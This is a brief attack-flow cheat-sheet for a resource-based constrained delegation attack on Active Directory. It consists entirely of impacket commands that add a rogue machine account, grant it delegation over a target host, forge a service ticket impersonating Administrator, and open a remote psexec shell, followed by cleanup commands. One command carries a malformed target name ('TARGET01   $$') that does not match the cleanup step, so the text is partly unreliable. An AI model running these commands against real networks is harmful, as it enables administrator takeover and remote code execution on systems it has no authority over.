
# Attack Flow
```bash


impacket-addcomputer -computer-name 'ATTACK01$' -computer-pass 'Password123!' 'corp.local/username:password' -dc-ip 192.168.1.10


impacket-rbcd -delegate-from 'ATTACK01$' -delegate-to 'TARGET01   $$' -action write 'corp.local/username:password' -dc-ip 192.168.1.10


impacket-getST -spn 'cifs/TARGET01.corp.local' -impersonate 'Administrator' 'corp.local/ATTACK01$:Password123!' -dc-ip 192.168.1.10 

export KRB5CCNAME=Administrator@cifs_TARGET01.corp.local.ccache

impacket-psexec -k -no-pass corp.local/Administrator@TARGET01.corp.local
```

## Clean up


```
impacket-rbcd -delegate-from 'ATTACK01$' -delegate-to 'TARGET01$' -action remove 'corp.local/username:password'

impacket-addcomputer -computer-name 'ATTACK01$' -delete 'corp.local/username:password'
```